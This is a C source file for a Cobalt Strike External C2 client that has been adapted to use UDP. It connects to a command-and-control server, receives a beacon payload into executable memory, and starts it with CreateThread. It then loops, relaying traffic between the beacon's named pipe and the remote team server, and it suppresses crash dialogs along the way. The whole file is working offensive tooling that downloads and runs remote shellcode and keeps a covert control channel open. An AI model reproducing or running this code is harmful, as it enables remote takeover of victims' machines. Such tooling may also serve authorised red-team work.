/**
 * client.c
 * by Daniel Fitzgerald
 * Jan 2020
 *
 * Program to provide TCP communications for Cobalt Strike using the External C2 feature.
 * 
 * Modified to run UDP by Ian Roberts
 */

#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#define FD_SETSIZE 1 //The default size of an FD set is 64 sockets, but we only need 1. Must be defined before including winsock2.h.
#define INIT_SEQNUM 0 //Initial sequence number for the client's transmissions
#define TIMEOUT_SEC  10 //number of seconds to wait before timeout. 

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024
#define PACKET_SIZE 1024			//Max payload size. Must be same as in server.py.
									//Note that actual payload sent will have size PACKET_SIZE + 4 due to sequence number.

// #define SA struct sockaddr



static DWORD server_seqnum = 0;
static DWORD my_seqnum = 0;

/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to an array containing the IP address to connect to
 * @param port A pointer to an array containing the port to connect on
 * @return A socket handle for the connection
*/
SOCKET create_socket(char* ip, char* port, char* my_ip, char* my_port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints, *my_info;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_protocol = IPPROTO_UDP;



	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Resolve our own address and port
	iResult = getaddrinfo(my_ip, my_port, &hints, &my_info);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}


	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	//Bind the socket to the given IP and port
	iResult = bind(ConnectSocket, my_info->ai_addr, (int) my_info->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("Bind Failure: %ld\n", WSAGetLastError());
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("Connection Failure%ld\n", WSAGetLastError());
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}


/**
 * Sends data to server received from our injected beacon
 *
 * @param sockset A set containing only the socket file descriptor
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
*/
void sendData(fd_set* sockset, const char* data, DWORD len, struct timeval* timeout_struct) {
	int pendingAck = 1;
	int socketsReady = 0;
	SOCKET sd = sockset->fd_array[0];
	char* sizepacket = malloc(8);
	char* ackpacket = malloc(4);
	memcpy(sizepacket, &my_seqnum, 4);
	memcpy((sizepacket+4), &len, 4); 
	while(pendingAck) {
		send(sd, sizepacket, 8, 0);
		socketsReady = select(0, sockset, NULL, NULL, timeout_struct);
		if (socketsReady > 0) {
			recv(sd, ackpacket, 3, 0);
			if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
				pendingAck = 0;
				my_seqnum++;
			}
			memset(ackpacket, 0, 4);
		}
		timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
	}
	char* packet = calloc(PACKET_SIZE+4, 1);
	memset(ackpacket, 0, 4);
	int remaining = len;
	// printf("Sending %d bytes.\n", len);
	while (remaining > 0) {
		pendingAck = 1;
		DWORD temp = 0;
		memcpy(packet, &my_seqnum, 4);
		memcpy((packet + 4), (data + (len-remaining)), PACKET_SIZE);
		while(pendingAck) {
			select(0, NULL, sockset, NULL, timeout_struct);
			if (remaining >= PACKET_SIZE) {
				temp = send(sd, packet, PACKET_SIZE+4, 0);
			} else {
				temp = send(sd, packet, remaining+4, 0);
			}
			timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
			// printf("sent: %d bytes\n", temp);
			// printf("Waiting for ACK\n");
			socketsReady = select(0, sockset, NULL, NULL, timeout_struct);
			if (socketsReady > 0) {
				recv(sd, ackpacket, 3, 0);
				// printf("contents of ackpacket: %s\n", ackpacket);
				if (*(ackpacket) == 0x41 && *(ackpacket+1) == 0x43 && *(ackpacket+2) == 0x4B) {
					pendingAck = 0;
					my_seqnum++;
					remaining = remaining - temp + 4;
				}
				memset(ackpacket, 0, 4);
			}
			timeout_struct->tv_sec = TIMEOUT_SEC; //Timeout must be reset after every select() call
		}
		
		memset(packet, 0, PACKET_SIZE+4);
	}

	free(sizepacket);
	free(ackpacket);
	free(packet);
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 * TODO - this method could include some robustness to out-of-order transmission instead of just doing the ACK dance. 
 *			I was thinking maybe an array to keep track of which sections of the payload buffer are filled.
 *
 * @param sockset A set containing only the socket file descriptor
 * @param buffer Buffer to store data in
 * @param max unused
 * @return Size of data recieved
*/
DWORD recvData(fd_set* sockset, char * buffer, DWORD max, struct timeval* timeout_struct) {
	SOCKET sd = sockset->fd_array[0];
	// printf("Receiving Data\n");
	char* sizePacket = malloc(8);
	DWORD size = 0, total = 0, temp = 0, seqnum = 0;

	/* read the 4-byte length */
	while (size == 0) {
		recv(sd, sizePacket, 8, 0);		//Due to the small size, we assume this succeeds in reading all 8 bytes. 
		seqnum = *((DWORD*)sizePacket);
		if (seqnum <= server_seqnum) {
			send(sd, "ACK", 4, 0);
			if (seqnum == server_seqnum) {
				server_seqnum++;							//Note: under this implementation, there is a limit to the number of packets per connection.
				size = *((DWORD*)(sizePacket + 4));			//Once the sequence number overflows, this breaks. 
			} else {
				printf("Received out of order on size packet.\n");
			}
		}
	}

	// printf("Size: 0x%08x\n", size);

	char* packet = calloc(PACKET_SIZE+4, 1);

	/* read in the data */
	while (total < size) {
		temp = recv(sd, packet, PACKET_SIZE+4, 0);		//No danger of reading more than a single packet, as UDP sockets store disjoint datagrams.
		seqnum = *((DWORD*) packet);
		if (seqnum <= server_seqnum) {
			send(sd, "ACK", 4, 0);
			if (seqnum == server_seqnum) {
				server_seqnum++;
				memcpy((buffer + total), (packet + 4), temp - 4);
				total += temp - 4;
			} else {
				printf("Received out of order on data packet\n");
			}
		}
		memset(packet, 0, PACKET_SIZE+4);
		// printf("Total: %08x\n", total);		
	}
	free(packet);
	free(sizePacket);
	return size;

}

/**
 * Initiate connection with server via a UDP three-way handshake
 * 
 * @param sockset set containing the UDP socket to send/receive from
 * @param timeout_struct Structure containing timeout information
 */
void threeWayHandshake(fd_set* sockset, struct timeval* timeout_struct) {
	int complete = 0;
	SOCKET sd = sockset->fd_array[0];
	char* synack = calloc(4, 1);
	while (complete == 0) {
		send(sd, (char *)&my_seqnum, 4, 0); //We assume this sends fully, due to the small size
		int ready = select(0, sockset, NULL, NULL, timeout_struct);
		if (ready > 0) {
			recv(sd, synack, 4, 0);
			server_seqnum = *(DWORD*)(synack);
			server_seqnum++;
			my_seqnum++;
			complete = 1;
		}
		timeout_struct->tv_sec = TIMEOUT_SEC;
	}
	send(sd, "ACK", 4, 0);
	free(synack);

}


/**
 * Read a frame from a handle
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Write a frame to a file
 * 
 * @param my_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}


/**
 * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 */
void main(int argc, char* argv[])
//TODO - add argument for IPv4 vs IPv6. TCP allows for protocol-agnostic sockets, UDP does not. 
{
	// Set connection info
	if (argc != 7)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: client.exe [SERVER_IP] [PORT] [PIPE_STR] [CLIENT_IP] [CLIENT_PORT] [SLEEP]");
		exit(1);
	}

	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	char* IP = argv[1];
	char* PORT = argv[2];
	char* my_ip = argv[4];
	char* my_port = argv[5];
	my_seqnum = 0;
	server_seqnum = 0;
	
	char pipe_str[50];
	strncpy(pipe_str, argv[3], sizeof(pipe_str));

	int sleep;
	sleep = atoi(argv[6]);

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT, my_ip, my_port);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		exit(1);
	}
	printf("Socket Created\n");

	//Create socket set of 1 socket
	//This is so we can use the select() function on our socket
	fd_set sock_set;
	FD_ZERO(&sock_set);
	FD_SET(sockfd, &sock_set);

	// Create timeval structure for 5 seconds
	// This is so we can use the select() function on our socket without infinite blocking
	struct timeval timeout_struct;
	ZeroMemory(&timeout_struct, sizeof(timeout_struct));
	timeout_struct.tv_sec = TIMEOUT_SEC;
	timeout_struct.tv_usec = 0;

	// run 3-way handshake with beacon
	threeWayHandshake(&sock_set, &timeout_struct);
	printf("Handshake completed.\n");

	// Recv beacon payload
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
	{
		printf("payload buffer malloc failed!\n");
		exit(1);
	}

	DWORD payload_size = recvData(&sock_set, payload, PAYLOAD_MAX_SIZE, &timeout_struct);
	if (payload_size < 0)
	{
		printf("recvData error, exiting\n");
		free(payload);
		exit(1);
	}
	printf("Recv %d byte payload from TS\n", payload_size);
	/* inject the payload stage into the current process */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);

	printf("Thread Created, payload received intact\n");

	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, pipe_str);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
	}
	printf("Connected to pipe!!\n");

	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		printf("buffer malloc failed!\n");
		free(payload);
		exit(1);
	}

	while (1) {
		// Start the pipe dance
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("read_frame error, exiting\n");
			break;
		}
		printf("Recv %d bytes from beacon\n", read_size);
		
		if (read_size == 1)
		{
			printf("Finished sending, sleeping %d seconds..\n", sleep);
			Sleep(sleep*1000);
		}

		sendData(&sock_set, buffer, read_size, &timeout_struct);
		printf("Sent to TS\n");
		
		read_size = recvData(&sock_set, buffer, BUFFER_MAX_SIZE, &timeout_struct);
		if (read_size < 0)
		{
			printf("recvData error, exiting\n");
			break;
		}
		printf("Recv %d bytes from TS\n", read_size);

		write_frame(beaconPipe, buffer, read_size);
		printf("Sent to beacon\n");
	}
	FD_CLR(sockfd, &sock_set);
	free(payload);
	free(buffer);
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	exit(0);
}

